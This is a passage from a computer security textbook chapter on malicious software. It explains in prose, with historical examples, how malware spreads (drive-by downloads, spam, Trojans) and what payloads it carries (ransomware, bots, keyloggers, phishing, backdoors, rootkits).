as a worm does, but rather waits for unsuspecting \\r\\nusers to visit the malicious webpage in order to spread to their systems [SYMA16].\\r\\nIn general, drive-by-download attacks are aimed at anyone who visits a compro\\ufffemised site and is vulnerable to the exploits used. Watering-hole attacks are a variant \\r\\nof this used in highly targeted attacks. The attacker researches their intended victims \\r\\nto identify websites they are likely to visit, then scans these sites to identify those \\r\\nwith vulnerabilities that allow their compromise with a drive-by-download attack. \\r\\nThey then wait for one of their intended victims to visit one of the compromised sites. \\r\\nTheir attack code may even be written so that it will only infect systems belonging to \\r\\nthe target organization, and take no action for other visitors to the site. This greatly \\r\\nincreases the likelihood of the site compromise remaining undetected.\\r\\nMalvertising is another technique used to place malware on websites without \\r\\nactually compromising them. The attacker pays for advertisements that are highly \\r\\nlikely to be placed on their intended target websites, and which incorporate malware \\r\\nin them. Using these malicious adds, attackers can infect visitors to sites displaying \\r\\nthem. Again, the malware code may be dynamically generated to either reduce the \\r\\nchance of detection, or to only infect specific systems. Malvertising has grown rapidly \\r\\nin recent years, as they are easy to place on desired websites with few questions asked, \\r\\nM06_STAL0611_04_GE_C06.indd 223 10/11/17 2:51 PM\\n\\n\\n224 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nand are hard to track. Attackers have placed these ads for as little as a few hours, \\r\\nwhen they expect their intended victims could be browsing the targeted websites, \\r\\ngreatly reducing their visibility [SYMA16].\\r\\nOther malware may target common PDF viewers to also download and install \\r\\nmalware without the user’s consent when they view a malicious PDF document \\r\\n[STEV11]. Such documents may be spread by spam e-mail, or be part of a targeted \\r\\nphishing attack, as we will discuss in the next section.\\r\\nClickjacking\\r\\nClickjacking, also known as a user-interface (UI) redress attack, is a vulnerability used \\r\\nby an attacker to collect an infected user’s clicks. The attacker can force the user \\r\\nto do a variety of things from adjusting the user’s computer settings to unwittingly \\r\\nsending the user to websites that might have malicious code. Also, by taking advan\\ufffetage of Adobe Flash or JavaScript, an attacker could even place a button under or \\r\\nover a legitimate button, making it difficult for users to detect. A typical attack uses \\r\\nmultiple transparent or opaque layers to trick a user into clicking on a button or link \\r\\non another page when they were intending to click on the top level page. Thus, the \\r\\nattacker is hijacking clicks meant for one page and routing them to another page, \\r\\nmost likely owned by another application, domain, or both.\\r\\nUsing a similar technique, keystrokes can also be hijacked. With a carefully \\r\\ncrafted combination of stylesheets, iframes, and text boxes, a user can be led to believe \\r\\nthey are typing in the password to their e-mail or bank account, but are instead typing \\r\\ninto an invisible frame controlled by the attacker.\\r\\nThere is a wide variety of techniques for accomplishing a clickjacking attack, \\r\\nand new techniques are developed as defenses to older techniques are put in place. \\r\\n[NIEM11] and [STON10] are useful discussions.\\r\\n6.5 PROPAGATION—SOCIAL ENGINEERING—SPAM E-MAIL, \\r\\nTROJANS\\r\\nThe final category of malware propagation we consider involves social engineering, \\r\\n“tricking” users to assist in the compromise of their own systems or personal informa\\ufffetion. This can occur when a user views and responds to some SPAM e-mail, or permits \\r\\nthe installation and execution of some Trojan horse program or scripting code.\\r\\nSpam (Unsolicited Bulk) E-Mail\\r\\nWith the explosive growth of the Internet over the last few decades, the widespread \\r\\nuse of e-mail, and the extremely low cost required to send large volumes of e-mail, has \\r\\ncome the rise of unsolicited bulk e-mail, commonly known as spam. [SYMA16] notes \\r\\nthat more than half of inbound business e-mail traffic is still spam, despite a gradual \\r\\ndecline in recent years. This imposes significant costs on both the network infrastruc\\ufffeture needed to relay this traffic, and on users who need to filter their legitimate e-mails \\r\\nout of this flood. In response to this explosive growth, there has been the equally rapid \\r\\ngrowth of the anti-spam industry that provides products to detect and filter spam \\r\\ne-mails. This has led to an arms race between the spammers devising techniques to \\r\\nsneak their content through, and with the defenders, efforts to block them [KREI09].\\r\\nM06_STAL0611_04_GE_C06.indd 224 10/11/17 2:51 PM\\n\\n\\n6.5 / PROPAGATION—SOCIAL ENGINEERING—SPAM E-MAIL, TROJANS 225\\r\\nHowever, the spam problem continues, as spammers exploit other means of \\r\\nreaching their victims. This includes the use of social media, reflecting the rapid growth \\r\\nin the use of these networks. For example, [SYMA16] described a successful weight\\ufffeloss spam campaign that exploited hundreds of thousands of fake Twitter accounts, \\r\\nmutually supporting and reinforcing each other, to increase their credibility and likeli\\ufffehood of users following them, and then falling for the scam. Social network scams often \\r\\nrely on victims sharing the scam, or on fake offers with incentives, to assist their spread.\\r\\nWhile some spam e-mail is sent from legitimate mail servers using stolen user \\r\\ncredentials, most recent spam is sent by botnets using compromised user systems, \\r\\nas we will discuss in Section 6.6. A significant portion of spam e-mail content is just \\r\\nadvertising, trying to convince the recipient to purchase some product online, such \\r\\nas pharmaceuticals, or used in scams, such as stock, romance or fake trader scams, or \\r\\nmoney mule job ads. But spam is also a significant carrier of malware. The e-mail may \\r\\nhave an attached document, which, if opened, may exploit a software vulnerability \\r\\nto install malware on the user’s system, as we discussed in the previous section. Or, it \\r\\nmay have an attached Trojan horse program or scripting code that, if run, also installs \\r\\nmalware on the user’s system. Some Trojans avoid the need for user agreement by \\r\\nexploiting a software vulnerability in order to install themselves, as we will discuss \\r\\nnext. Finally the spam may be used in a phishing attack, typically directing the user \\r\\neither to a fake website that mirrors some legitimate service, such as an online bank\\ufffeing site, where it attempts to capture the user’s login and password details; or to com\\ufffeplete some form with sufficient personal details to allow the attacker to impersonate \\r\\nthe user in an identity theft. In recent years, the evolving criminal marketplace makes \\r\\nphishing campaigns easier by selling packages to scammers that largely automate the \\r\\nprocess of running the scam [SYMA16]. All of these uses make spam e-mails a sig\\ufffenificant security concern. However, in many cases, it requires the user’s active choice \\r\\nto view the e-mail and any attached document, or to permit the installation of some \\r\\nprogram, in order for the compromise to occur. Hence the importance of providing \\r\\nappropriate security awareness training to users, so they are better able to recognize \\r\\nand respond appropriately to such e-mails, as we will discuss in Chapter 17.\\r\\nTrojan Horses\\r\\nA Trojan horse2\\r\\n is a useful, or apparently useful, program or utility containing hidden \\r\\ncode that, when invoked, performs some unwanted or harmful function.\\r\\nTrojan horse programs can be used to accomplish functions indirectly that the \\r\\nattacker could not accomplish directly. For example, to gain access to sensitive, per\\ufffesonal information stored in the files of a user, an attacker could create a Trojan \\r\\nhorse program that, when executed, scans the user’s files for the desired sensitive \\r\\ninformation and sends a copy of it to the attacker via a webform or e-mail or text \\r\\nmessage. The author could then entice users to run the program by incorporating it \\r\\ninto a game or useful utility program, and making it available via a known software \\r\\n2\\r\\nIn Greek mythology, the Trojan horse was used by the Greeks during their siege of Troy. Epeios con\\ufffestructed a giant hollow wooden horse in which 30 of the most valiant Greek heroes concealed themselves. \\r\\nThe rest of the Greeks burned their encampment and pretended to sail away but actually hid nearby. \\r\\nThe Trojans, convinced the horse was a gift and the siege over, dragged the horse into the city. That night, \\r\\nthe Greeks emerged from the horse and opened the city gates to the Greek army. A bloodbath ensued, \\r\\nresulting in the destruction of Troy and the death or enslavement of all its citizens.\\r\\nM06_STAL0611_04_GE_C06.indd 225 10/11/17 2:51 PM\\n\\n\\n226 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\ndistribution site or app store. This approach has been used recently with utilities that \\r\\n“claim” to be the latest anti-virus scanner, or security update, for systems, but which \\r\\nare actually malicious Trojans, often carrying payloads such as spyware that searches \\r\\nfor banking credentials. Hence, users need to take precautions to validate the source \\r\\nof any software they install.\\r\\nTrojan horses fit into one of three models:\\r\\n• Continuing to perform the function of the original program and additionally \\r\\nperforming a separate malicious activity.\\r\\n• Continuing to perform the function of the original program but modifying the \\r\\nfunction to perform malicious activity (e.g., a Trojan horse version of a login \\r\\nprogram that collects passwords) or to disguise other malicious activity (e.g., a \\r\\nTrojan horse version of a process listing program that does not display certain \\r\\nprocesses that are malicious).\\r\\n• Performing a malicious function that completely replaces the function of the \\r\\noriginal program.\\r\\nSome Trojans avoid the requirement for user assistance by exploiting some software \\r\\nvulnerability to enable their automatic installation and execution. In this, they share \\r\\nsome features of a worm, but unlike it, they do not replicate. A prominent example \\r\\nof such an attack was the Hydraq Trojan used in Operation Aurora in 2009 and early \\r\\n2010. This exploited a vulnerability in Internet Explorer to install itself, and targeted \\r\\nseveral high-profile companies. It was typically distributed using either spam e-mail or \\r\\nvia a compromised website using a “watering-hole” attack. Tech Support Scams are a \\r\\ngrowing social engineering concern. These involve call centers calling users about non\\ufffeexistent problems on their computer systems. If the users respond, the attackers try to \\r\\nsell them bogus tech support or ask them to install Trojan malware or other unwanted \\r\\napplications on their systems, all while claiming this will fix their problem [SYMA16].\\r\\nMobile Phone Trojans\\r\\nMobile phone Trojans also first appeared in 2004 with the discovery of Skuller. As \\r\\nwith mobile worms, the target is the smartphone, and the early mobile Trojans tar\\ufffegeted Symbian phones. More recently, a significant number of Trojans have been \\r\\ndetected that target Android phones and Apple iPhones. These Trojans are usually \\r\\ndistributed via one or more of the app marketplaces for the target phone O/S.\\r\\nThe rapid growth in smartphone sales and use, which increasingly contain valu\\ufffeable personal information, make them an attractive target for criminals and other \\r\\nattackers. Given five in six new phones run Android, they are a key target [SYMA16]. \\r\\nThe number of vulnerabilities discovered in, and malware families targeting these \\r\\nphones, have both increased steadily in recent years. Recent examples include a \\r\\nphishing Trojan that tricks the user into entering their banking details, and ransom\\ufffeware that mimics Google’s design style to appear more legitimate and intimidating.\\r\\nThe tighter controls that Apple impose on their app store, mean that many \\r\\niPhone Trojans target “jail-broken” phones, and are distributed via unofficial sites. \\r\\nHowever a number of versions of the iPhone O/S contained some form of graphic \\r\\nor PDF vulnerability. Indeed these vulnerabilities were the main means used to “jail\\ufffebreak” the phones. But they also provided a path that malware could use to target \\r\\nthe phones. While Apple has fixed a number of these vulnerabilities, new variants \\r\\nM06_STAL0611_04_GE_C06.indd 226 10/11/17 2:51 PM\\n\\n\\n6.6 / PAYLOAD—SYSTEM CORRUPTION 227\\r\\ncontinued to be discovered. This is yet another illustration of just how difficult it is, for \\r\\neven well- resourced organizations, to write secure software within a complex system, \\r\\nsuch as an operating system. We will return to this topic in Chapters 10 and 11. More \\r\\nrecently in 2015, XcodeGhost malware was discovered in a number of legitimate \\r\\nApple Store apps. The apps were not intentionally designed to be malicious, but their \\r\\ndevelopers used a compromised Xcode development system that covertly installed \\r\\nthe malware as the apps were created [SYMA16]. This is one of several examples \\r\\nof attackers exploiting the development or enterprise provisioning infrastructure to \\r\\nassist malware distribution.\\r\\n6.6 PAYLOAD—SYSTEM CORRUPTION\\r\\nOnce malware is active on the target system, the next concern is what actions it \\r\\nwill take on this system. That is, what payload does it carry? Some malware has a \\r\\nnonexistent or nonfunctional payload. Its only purpose, either deliberate or due to \\r\\naccidental early release, is to spread. More commonly, it carries one or more payloads \\r\\nthat perform covert actions for the attacker.\\r\\nAn early payload seen in a number of viruses and worms resulted in data destruc\\ufffetion on the infected system when certain trigger conditions were met [WEAV03]. A \\r\\nrelated payload is one that displays unwanted messages or content on the user’s system \\r\\nwhen triggered. More seriously, another variant attempts to inflict real-world dam\\ufffeage on the system. All of these actions target the integrity of the computer system’s \\r\\nsoftware or hardware, or of the user’s data. These changes may not occur immediately, \\r\\nbut only when specific trigger conditions are met that satisfy their logic-bomb code.\\r\\nData Destruction and Ransomware\\r\\nThe Chernobyl virus is an early example of a destructive parasitic memory-resident \\r\\nWindows-95 and 98 virus, which was first seen in 1998. It infects executable files \\r\\nwhen they are opened. And when a trigger date is reached, the virus deletes data on \\r\\nthe infected system by overwriting the first megabyte of the hard drive with zeroes, \\r\\nresulting in massive corruption of the entire file system. This first occurred on April \\r\\n26, 1999, when estimates suggest more than one million computers were affected.\\r\\nSimilarly, the Klez mass-mailing worm is an early example of a destructive \\r\\nworm infecting Windows-95 to XP systems, and was first seen in October 2001. It \\r\\nspreads by e-mailing copies of itself to addresses found in the address book and in \\r\\nfiles on the system. It can stop and delete some anti-virus programs running on the \\r\\nsystem. On trigger dates, being the 13th of several months each year, it causes files \\r\\non the local hard drive to become empty.\\r\\nAs an alternative to just destroying data, some malware encrypts the user’s \\r\\ndata, and demands payment in order to access the key needed to recover this infor\\ufffemation. This is known as ransomware. The PC Cyborg Trojan seen in 1989 was an \\r\\nearly example of this. However, around mid-2006, a number of worms and Trojans \\r\\nappeared, such as the Gpcode Trojan, that used public-key cryptography with increas\\ufffeingly larger key sizes to encrypt data. The user needed to pay a ransom, or to make \\r\\na purchase from certain sites, in order to receive the key to decrypt this data. While \\r\\nearlier instances used weaker cryptography that could be cracked without paying the \\r\\nM06_STAL0611_04_GE_C06.indd 227 10/11/17 2:51 PM\\n\\n\\n228 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nransom, the later versions using public-key cryptography with large key sizes could \\r\\nnot be broken this way. [SYMA16, VERI16] note that ransomware is a growing chal\\ufffelenge, comprising one of the most common types of malware installed on systems, \\r\\nand is often spread via “drive-by-downloads” or via SPAM e-mails.\\r\\nThe WannaCry ransomware, that we mentioned earlier in our discussion of \\r\\nWorms, infected a large number of systems in many countries in May 2017. When \\r\\ninstalled on infected systems, it encrypted a large number of files matching a list of \\r\\nparticular file types, and then demanded a ransom payment in Bitcoins to recover \\r\\nthem. Once this had occurred, recovery of this information was generally only possible \\r\\nif the organization had good backups, and an appropriate incident response and disas\\ufffeter recovery plan, as we will discuss in Chapter 17. The WannaCry ransomware attack \\r\\ngenerated a significant amount of media attention, in part due to the large number of \\r\\naffected organizations, and the significant costs they incurred in recovering from it. The \\r\\ntargets for these attacks have widened beyond personal computer systems to include \\r\\nmobile devices and Linux servers. And tactics such as threatening to publish sensi\\ufffetive personal information, or to permanently destroy the encryption key after a short \\r\\nperiod of time, are sometimes used to increase the pressure on the victim to pay up.\\r\\nReal-World Damage\\r\\nA further variant of system corruption payloads aims to cause damage to physi\\ufffecal equipment. The infected system is clearly the device most easily targeted. The \\r\\nChernobyl virus mentioned above not only corrupts data, but attempts to rewrite the \\r\\nBIOS code used to initially boot the computer. If it is successful, the boot process fails, \\r\\nand the system is unusable until the BIOS chip is either re-programmed or replaced.\\r\\nMore recently, the Stuxnet worm that we discussed previously targets some \\r\\nspecific industrial control system software as its key payload [CHEN11, KUSH13]. \\r\\nIf control systems using certain Siemens industrial control software with a specific \\r\\nconfiguration of devices are infected, then the worm replaces the original control \\r\\ncode with code that deliberately drives the controlled equipment outside its normal \\r\\noperating range, resulting in the failure of the attached equipment. The centrifuges \\r\\nused in the Iranian uranium enrichment program were strongly suspected as the tar\\ufffeget, with reports of much higher than normal failure rates observed in them over the \\r\\nperiod when this worm was active. As noted in our earlier discussion, this has raised \\r\\nconcerns over the use of sophisticated targeted malware for industrial sabotage.\\r\\nThe British Government’s 2015 Security and Defense Review noted their \\r\\ngrowing concerns over the use of cyber attacks against critical infrastructure by \\r\\nboth state-sponsored and non state actors. The December 2015 attack that disrupted \\r\\nUkrainian power systems shows these concerns are well-founded, given that much \\r\\ncritical infrastructure is not sufficiently hardened to resist such attacks [SYMA16].\\r\\nLogic Bomb\\r\\nA key component of data-corrupting malware is the logic bomb. The logic bomb is \\r\\ncode embedded in the malware that is set to “explode” when certain conditions are \\r\\nmet. Examples of conditions that can be used as triggers for a logic bomb are the \\r\\npresence or absence of certain files or devices on the system, a particular day of the \\r\\nweek or date, a particular version or configuration of some software, or a particular \\r\\nM06_STAL0611_04_GE_C06.indd 228 10/11/17 2:51 PM\\n\\n\\n6.7 / PAYLOAD—ATTACK AGENT—ZOMBIE, BOTS 229\\r\\nuser running the application. Once triggered, a bomb may alter or delete data or \\r\\nentire files, cause a machine to halt, or do some other damage.\\r\\nA striking example of how logic bombs can be employed was the case of Tim \\r\\nLloyd, who was convicted of setting a logic bomb that cost his employer, Omega \\r\\nEngineering, more than $10 million, derailed its corporate growth strategy, and even\\ufffetually led to the layoff of 80 workers [GAUD00]. Ultimately, Lloyd was sentenced to \\r\\n41 months in prison and ordered to pay $2 million in restitution.\\r\\n6.7 PAYLOAD—ATTACK AGENT—ZOMBIE, BOTS\\r\\nThe next category of payload we discuss is where the malware subverts the compu\\ufffetational and network resources of the infected system for use by the attacker. Such \\r\\na system is known as a bot (robot), zombie or drone, and secretly takes over another \\r\\nInternet-attached computer then uses that computer to launch or manage attacks that \\r\\nare difficult to trace to the bot’s creator. The bot is typically planted on hundreds or \\r\\nthousands of computers belonging to unsuspecting third parties. The compromised \\r\\nsystems are not just personal computers, but include servers, and recently embedded \\r\\ndevices such as routers or surveillance cameras. The collection of bots often is capable \\r\\nof acting in a coordinated manner; such a collection is referred to as a botnet. This \\r\\ntype of payload attacks the integrity and availability of the infected system.\\r\\nUses of Bots\\r\\n[HONE05] lists the following uses of bots:\\r\\n• Distributed denial-of-service (DDoS) attacks: A DDoS attack is an attack on \\r\\na computer system or network that causes a loss of service to users. We will \\r\\nexamine DDoS attacks in Chapter 7.\\r\\n• Spamming: With the help of a botnet and thousands of bots, an attacker is able \\r\\nto send massive amounts of bulk e-mail (spam).\\r\\n• Sniffing traffic: Bots can also use a packet sniffer to watch for interesting clear\\ufffetext data passing by a compromised machine. The sniffers are mostly used to \\r\\nretrieve sensitive information like usernames and passwords.\\r\\n• Keylogging: If the compromised machine uses encrypted communication chan\\ufffenels (e.g., HTTPS or POP3S), then just sniffing the network packets on the \\r\\nvictim’s computer is useless because the appropriate key to decrypt the packets \\r\\nis missing. But by using a keylogger, which captures keystrokes on the infected \\r\\nmachine, an attacker can retrieve sensitive information.\\r\\n• Spreading new malware: Botnets are used to spread new bots. This is very easy \\r\\nsince all bots implement mechanisms to download and execute a file via HTTP \\r\\nor FTP. A botnet with 10,000 hosts that acts as the start base for a worm or mail \\r\\nvirus allows very fast spreading and thus causes more harm.\\r\\n• Installing advertisement add-ons and browser helper objects (BHOs): Botnets \\r\\ncan also be used to gain financial advantages. This works by setting up a fake \\r\\nwebsite with some advertisements: The operator of this website negotiates a \\r\\ndeal with some hosting companies that pay for clicks on ads. With the help of a \\r\\nM06_STAL0611_04_GE_C06.indd 229 10/11/17 2:51 PM\\n\\n\\n230 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nbotnet, these clicks can be “automated” so instantly a few thousand bots click \\r\\non the pop-ups. This process can be further enhanced if the bot hijacks the \\r\\nstart-page of a compromised machine so the “clicks” are executed each time \\r\\nthe victim uses the browser.\\r\\n• Attacking IRC chat networks: Botnets are also used for attacks against Internet \\r\\nRelay Chat (IRC) networks. Popular among attackers is especially the so-called \\r\\nclone attack: In this kind of attack, the controller orders each bot to connect a \\r\\nlarge number of clones to the victim IRC network. The victim is flooded by service \\r\\nrequests from thousands of bots or thousands of channel-joins by these cloned bots. \\r\\nIn this way, the victim IRC network is brought down, similar to a DDoS attack.\\r\\n• Manipulating online polls/games: Online polls/games are getting more and \\r\\nmore attention and it is rather easy to manipulate them with botnets. Since \\r\\nevery bot has a distinct IP address, every vote will have the same credibility as \\r\\na vote cast by a real person. Online games can be manipulated in a similar way.\\r\\nRemote Control Facility\\r\\nThe remote control facility is what distinguishes a bot from a worm. A worm propa\\ufffegates itself and activates itself, whereas a bot is controlled by some form of command\\ufffeand-control (C&C) server network. This contact does not need to be continuous, but \\r\\ncan be initiated periodically when the bot observes it has network access.\\r\\nAn early means of implementing the remote control facility used an IRC server. \\r\\nAll bots join a specific channel on this server and treat incoming messages as com\\ufffemands. More recent botnets tend to avoid IRC mechanisms and use covert commu\\ufffenication channels via protocols such as HTTP. Distributed control mechanisms, using \\r\\npeer-to-peer protocols, are also used, to avoid a single point of failure.\\r\\nOriginally these C&C servers used fixed addresses, which meant they could be \\r\\nlocated and potentially taken over or removed by law enforcement agencies. Some \\r\\nmore recent malware families have used techniques such as the automatic generation \\r\\nof very large numbers of server domain names that the malware will try to contact. \\r\\nIf one server name is compromised, the attackers can setup a new server at another \\r\\nname they know will be tried. To defeat this requires security analysts to reverse \\r\\nengineer the name generation algorithm, and to then attempt to gain control over all \\r\\nof the extremely large number of possible domains. Another technique used to hide \\r\\nthe servers is fast-flux DNS, where the address associated with a given server name is \\r\\nfrequently changed, often every few minutes, to rotate over a large number of server \\r\\nproxies, usually other members of the botnet. Such approaches hinder attempts by \\r\\nlaw enforcement agencies to respond to the botnet threat.\\r\\nOnce a communications path is established between a control module and the \\r\\nbots, the control module can manage the bots. In its simplest form, the control module \\r\\nsimply issues command to the bot that causes the bot to execute routines that are \\r\\nalready implemented in the bot. For greater flexibility, the control module can issue \\r\\nupdate commands that instruct the bots to download a file from some Internet loca\\ufffetion and execute it. The bot in this latter case becomes a more general-purpose tool \\r\\nthat can be used for multiple attacks. The control module can also collect informa\\ufffetion gathered by the bots that the attacker can then exploit. One effective counter \\r\\nmeasure against a botnet is to take-over or shutdown its C&C network. Increasing \\r\\ncooperation and coordination between law enforcement agencies in a number of \\r\\nM06_STAL0611_04_GE_C06.indd 230 10/11/17 2:51 PM\\n\\n\\n6.8 / PAYLOAD—INFORMATION THEFT—KEYLOGGERS, PHISHING, SPYWARE 231\\r\\ncountries resulted in a growing number of successful C&C seizures in recent years \\r\\n[SYMA16], and the consequent suppression of their associated botnets. These actions \\r\\nalso resulted in criminal charges on a number of people associated with them.\\r\\n6.8 PAYLOAD—INFORMATION THEFT—KEYLOGGERS, \\r\\nPHISHING, SPYWARE\\r\\nWe now consider payloads where the malware gathers data stored on the infected \\r\\nsystem for use by the attacker. A common target is the user’s login and password \\r\\ncredentials to banking, gaming, and related sites, which the attacker then uses to \\r\\nimpersonate the user to access these sites for gain. Less commonly, the payload may \\r\\ntarget documents or system configuration details for the purpose of reconnaissance \\r\\nor espionage. These attacks target the confidentiality of this information.\\r\\nCredential Theft, Keyloggers, and Spyware\\r\\nTypically, users send their login and password credentials to banking, gaming, and \\r\\nrelated sites over encrypted communication channels (e.g., HTTPS or POP3S), which \\r\\nprotect them from capture by monitoring network packets. To bypass this, an attacker \\r\\ncan install a keylogger, which captures keystrokes on the infected machine to allow an \\r\\nattacker to monitor this sensitive information. Since this would result in the attacker \\r\\nreceiving a copy of all text entered on the compromised machine, keyloggers typically \\r\\nimplement some form of filtering mechanism that only returns information close to \\r\\ndesired keywords (e.g., “login” or “password” or “paypal.com”).\\r\\nIn response to the use of keyloggers, some banking and other sites switched to \\r\\nusing a graphical applet to enter critical information, such as passwords. Since these \\r\\ndo not use text entered via the keyboard, traditional keyloggers do not capture this \\r\\ninformation. In response, attackers developed more general spyware payloads, which \\r\\nsubvert the compromised machine to allow monitoring of a wide range of activity on \\r\\nthe system. This may include monitoring the history and content of browsing activ\\ufffeity, redirecting certain webpage requests to fake sites controlled by the attacker, and \\r\\ndynamically modifying data exchanged between the browser and certain websites \\r\\nof interest, all of which can result in significant compromise of the user’s personal \\r\\ninformation.\\r\\nThe Zeus banking Trojan, created from its crimeware toolkit, is a prominent \\r\\nexample of such spyware that has been widely deployed [BINS10]. It steals banking \\r\\nand financial credentials using both a keylogger and capturing and possibly altering \\r\\nform data for certain websites. It is typically deployed using either spam e-mails or \\r\\nvia a compromised website in a “drive-by-download.”\\r\\nPhishing and Identity Theft\\r\\nAnother approach used to capture a user’s login and password credentials is to \\r\\ninclude a URL in a spam e-mail that links to a fake website controlled by the attacker, \\r\\nbut which mimics the login page of some banking, gaming, or similar site. This is nor\\ufffemally included in some message suggesting that urgent action is required by the user \\r\\nto authenticate their account, to prevent it being locked. If the user is careless, and \\r\\ndoes not realize that they are being conned, then following the link and supplying the \\r\\nM06_STAL0611_04_GE_C06.indd 231 10/11/17 2:51 PM\\n\\n\\n232 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nrequested details will certainly result in the attackers exploiting their account using \\r\\nthe captured credentials.\\r\\nMore generally, such a spam e-mail may direct a user to a fake website con\\ufffetrolled by the attacker, or to complete some enclosed form and return to an e-mail \\r\\naccessible to the attacker, which is used to gather a range of private, personal, infor\\ufffemation on the user. Given sufficient details, the attacker can then “assume” the user’s \\r\\nidentity for the purpose of obtaining credit, or sensitive access to other resources. This \\r\\nis known as a phishing attack and exploits social engineering to leverage user’s trust \\r\\nby masquerading as communications from a trusted source [GOLD10].\\r\\nSuch general spam e-mails are typically widely distributed to very large num\\ufffebers of users, often via a botnet. While the content will not match appropriate trusted \\r\\nsources for a significant fraction of the recipients, the attackers rely on it reaching \\r\\nsufficient users of the named trusted source, a gullible portion of whom will respond, \\r\\nfor it to be profitable.\\r\\nA more dangerous variant of this is the spear-phishing attack. This again is an \\r\\ne-mail claiming to be from a trusted source, but containing malicious attachments \\r\\ndisguised as fake invoices, office documents, or other expected content. However, the \\r\\nrecipients are carefully researched by the attacker, and each e-mail is carefully crafted \\r\\nto suit its recipient specifically, often quoting a range of information to convince them \\r\\nof its authenticity. This greatly increases the likelihood of the recipient responding as \\r\\ndesired by the attacker. This type of attack is particularly used in industrial and other \\r\\nforms of espionage, or in financial fraud such as bogus wire-transfer authorizations, \\r\\nby well-resourced organizations. Whether as a result of phishing, drive-by-download, \\r\\nor direct hacker attack, the number of incidents, and the quantity of personal records \\r\\nexposed, continues to grow. For example, the Anthem medical data breach in January \\r\\n2015 exposed more than 78 million personal information records that could poten\\ufffetially be used for identity theft. The well-resourced Black Vine cyber-espionage group \\r\\nis thought responsible for this attack [SYMA16].\\r\\nReconnaissance, Espionage, and Data Exfiltration\\r\\nCredential theft and identity theft are special cases of a more general reconnais\\ufffesance payload, which aims to obtain certain types of desired information and return \\r\\nthis to the attacker. These special cases are certainly the most common; however, \\r\\nother targets are known. Operation Aurora in 2009 used a Trojan to gain access to \\r\\nand potentially modify source code repositories at a range of high tech, security, \\r\\nand defense contractor companies [SYMA16]. The Stuxnet worm discovered in 2010 \\r\\nincluded capture of hardware and software configuration details in order to deter\\ufffemine whether it had compromised the specific desired target systems. Early versions \\r\\nof this worm returned this same information, which was then used to develop the \\r\\nattacks deployed in later versions [CHEN11, KUSH13]. There are a number of other \\r\\nhigh-profile examples of mass record exposure. These include the Wikileaks leak of \\r\\nsensitive military and diplomatic documents by Chelsea (born Bradley) Manning \\r\\nin 2010, and the release of information on NSA surveillance programs by Edward \\r\\nSnowden in 2013. Both of these are examples of insiders exploiting their legitimate \\r\\naccess rights to release information for ideological reasons. And both resulted in \\r\\nsignificant global discussion and debate on the consequences of these actions. In \\r\\ncontrast, the 2015 release of personal information on the users of the Ashley Madison \\r\\nM06_STAL0611_04_GE_C06.indd 232 10/11/17 2:51 PM\\n\\n\\n6.9 / PAYLOAD—STEALTHING—BACKDOORS, ROOTKITS 233\\r\\nadult website, and the 2016 Panama Papers leak of millions of documents relating to \\r\\noff-shore entities used as tax havens in at least some cases, are thought to have been \\r\\ncarried out by outside hackers attacking poorly secured systems. Both have resulted \\r\\nin serious consequences for some of the people named in these leaks.\\r\\nAPT attacks may result in the loss of large volumes of sensitive information, \\r\\nwhich is sent, exfiltrated from the target organization, to the attackers. To detect and \\r\\nblock such data exfiltration requires suitable “data-loss” technical counter measures \\r\\nthat manage either access to such information, or its transmission across the organi\\ufffezation’s network perimeter.\\r\\n6.9 PAYLOAD—STEALTHING—BACKDOORS, ROOTKITS\\r\\nThe final category of payload we discuss concerns techniques used by malware to \\r\\nhide its presence on the infected system, and to provide covert access to that system. \\r\\nThis type of payload also attacks the integrity of the infected system.\\r\\nBackdoor\\r\\nA backdoor, also known as a trapdoor, is a secret entry point into a program that \\r\\nallows someone who is aware of the backdoor to gain access without going through \\r\\nthe usual security access procedures. Programmers have used backdoors legitimately \\r\\nfor many years to debug and test programs; such a backdoor is called a maintenance \\r\\nhook. This usually is done when the programmer is developing an application that \\r\\nhas an authentication procedure, or a long setup, requiring the user to enter many \\r\\ndifferent values to run the application. To debug the program, the developer may \\r\\nwish to gain special privileges or to avoid all the necessary setup and authentica\\ufffetion. The programmer may also want to ensure that there is a method of activating \\r\\nthe program should something be wrong with the authentication procedure that is \\r\\nbeing built into the application. The backdoor is code that recognizes some special \\r\\nsequence of input or is triggered by being run from a certain user ID or by an unlikely \\r\\nsequence of events.\\r\\nBackdoors become threats when unscrupulous programmers use them to gain \\r\\nunauthorized access. The backdoor was the basic idea for the vulnerability portrayed \\r\\nin the 1983 movie War Games. Another example is that during the development of \\r\\nMultics, penetration tests were conducted by an Air Force “tiger team” (simulating \\r\\nadversaries). One tactic employed was to send a bogus operating system update to \\r\\na site running Multics. The update contained a Trojan horse that could be activated \\r\\nby a backdoor and that allowed the tiger team to gain access. The threat was so \\r\\nwell-implemented that the Multics developers could not find it, even after they were \\r\\ninformed of its presence [ENGE80].\\r\\nIn more recent times, a backdoor is usually implemented as a network service \\r\\nlistening on some non-standard port that the attacker can connect to and issue com\\ufffemands through to be run on the compromised system. The WannaCry ransomware, \\r\\nthat we described earlier in this chapter, included such a backdoor.\\r\\nIt is difficult to implement operating system controls for backdoors in appli\\ufffecations. Security measures must focus on the program development and software \\r\\nupdate activities, and on programs that wish to offer a network service.\\r\\nM06_STAL0611_04_GE_C06.indd 233 10/11/17 2:51 PM\\n\\n\\n234 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nRootkit\\r\\nA rootkit is a set of programs installed on a system to maintain covert access to that \\r\\nsystem with administrator (or root)3\\r\\n privileges, while hiding evidence of its presence \\r\\nto the greatest extent possible. This provides access to all the functions and services \\r\\nof the operating system. The rootkit alters the host’s standard functionality in a mali\\ufffecious and stealthy way. With root access, an attacker has complete control of the \\r\\nsystem and can add or change programs and files, monitor processes, send and receive \\r\\nnetwork traffic, and get backdoor access on demand.\\r\\nA rootkit can make many changes to a system to hide its existence, making \\r\\nit difficult for the user to determine that the rootkit is present and to identify what \\r\\nchanges have been made. In essence, a rootkit hides by subverting the mechanisms \\r\\nthat monitor and report on the processes, files, and registries on a computer.\\r\\nA rootkit can be classified using the following characteristics:\\r\\n• Persistent: Activates each time the system boots. The rootkit must store code \\r\\nin a persistent store, such as the registry or file system, and configure a method \\r\\nby which the code executes without user intervention. This means it is easier to \\r\\ndetect, as the copy in persistent storage can potentially be scanned.\\r\\n• Memory based: Has no 